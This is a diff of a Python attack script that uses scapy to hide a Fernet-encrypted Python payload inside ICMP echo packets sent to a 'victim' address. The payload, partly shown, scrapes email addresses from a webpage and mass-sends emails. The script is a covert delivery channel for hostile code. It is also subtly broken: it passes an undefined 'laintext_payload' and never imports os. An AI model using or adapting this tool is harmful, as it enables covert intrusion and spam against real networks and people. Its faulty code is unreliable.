@@ -1,11 +1,80 @@
 from scapy.all import *
 from cryptography.fernet import Fernet
+import sys
+import socket
+import struct
+
+
+
+def calculate_checksum(data):
+    if len(data) % 2 == 1:
+        data += b'\x00'
+    checksum = 0
+    for i in range(0, len(data), 2):
+        w = (data[i] << 8) + data[i + 1]
+        checksum += w
+    checksum = (checksum >> 16) + (checksum & 0xffff)
+    checksum = ~checksum & 0xffff
+    return checksum
+
+
+def encrypt_payload(payload, key):
+    fernet = Fernet(key)
+    encrypted_payload = fernet.encrypt(payload.encode())
+    return encrypted_payload
+
+
+def craft_icmp_packet(destination, payload):
+    # Create IP header
+    ip = IP(dst=destination)
+
+    # Create ICMP header
+    icmp = ICMP()
+
+    # Set the type and code of the ICMP packet
+    icmp.type = 8  # Echo Request
+    icmp.code = 0
+
+    # Encrypt the payload
+    key = Fernet.generate_key()
+    encrypted_payload = encrypt_payload(payload, key)
+
+    # Craft the payload
+    data = struct.pack('!H', os.getpid()) + key + encrypted_payload
+
+    # Calculate the checksum
+    checksum = calculate_checksum(icmp.build() + data)
+
+    # Set the checksum in the ICMP header
+    icmp.chksum = checksum
+
+    # Construct the final packet
+    packet = ip / icmp / data
+
+    return packet
+
 
 # Define the Fernet key
 fernet_key = b'your_fernet_key_here'  # Replace with your own Fernet key
 
 # Create an ICMP packet with encrypted payload
-plaintext_payload = """
+
+
+
+
+def send_icmp_packet(packet):
+    try:
+        send(packet)
+        print("ICMP packet sent successfully!")
+    except PermissionError:
+        print("Permission denied. Run the program as root/administrator.")
+    except socket.error as e:
+        print("Error sending ICMP packet:", str(e))
+
+
+if __name__ == '__main__':
+    destination_ip = '192.168.0.1'  # Replace with the destination IP address
+    plaintext_payload = """
 import smtplib
 import os
 import socket
@@ -314,20 +383,9 @@ def send_emails_to_addresses(emails):
 # Example usage
 webpage_url = 'https://www.example.com'  # Replace with the actual webpage URL
 emails = scrape_email_addresses(webpage_url)
-send_emails_to_addresses(emails)"
+send_emails_to_addresses(emails)"""  # Replace with your desired payload
+
+    packet = craft_icmp_packet(destination_ip, laintext_payload)
+    send_icmp_packet(packet)
 
 
-
-"""  # Modify this plaintext payload with the desired code
-
-# Create a Fernet object with the key
-fernet = Fernet(fernet_key)
-
-# Encrypt the plaintext payload
-encrypted_payload = fernet.encrypt(plaintext_payload.encode())
-
-# Create the packet with the encrypted payload
-packet = IP(dst="victim_ip") / ICMP() / encrypted_payload  # Replace "victim_ip" with the actual IP address of the victim
-
-# Send the packet
-send(packet)
